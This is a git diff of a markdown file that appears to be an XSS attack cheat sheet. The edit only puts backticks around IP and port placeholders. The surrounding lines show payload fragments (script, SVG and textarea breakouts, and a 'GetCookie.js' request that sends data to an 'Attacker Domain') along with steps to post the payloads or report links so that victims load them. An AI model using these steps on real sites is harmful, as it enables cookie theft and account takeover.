@@ -23,7 +23,7 @@
 </script>
 ```
 
-- Fill <IP> & <PORT> (Attacker Domain)
+- Fill `<IP>` & `<PORT>` (Attacker Domain)
 - Search above Script
 - Copy acquired Link
 - Report it
@@ -41,7 +41,7 @@
 "></svg>
 ```
 
-- Fill <IP> & <PORT> (Attacker Domain)
+- Fill `<IP>` & `<PORT>` (Attacker Domain)
 - Search above Script
 - Copy acquired Link
 - Report it
@@ -61,7 +61,7 @@
 <textarea>
 ```
 
-- Fill <IP> & <PORT> (Attacker Domain)
+- Fill `<IP>` & `<PORT>` (Attacker Domain)
 - Post above Script as Blog Content
 
 ---
@@ -75,7 +75,7 @@
 <textarea>
 ```
 
-- Fill <IP> & <PORT> (GetCookie.js Domain)
+- Fill `<IP>` & `<PORT>` (*GetCookie.js* Domain)
 - Post above Script as Blog Content
 
 #### *GetCookie.js*
@@ -87,6 +87,6 @@ HTTP.open('GET', URL, false);
 HTTP.send();
 ```
 
-- Fill <IP> & <PORT> (Attacker Domain)
+- Fill `<IP>` & `<PORT>` (Attacker Domain)
 
 ---
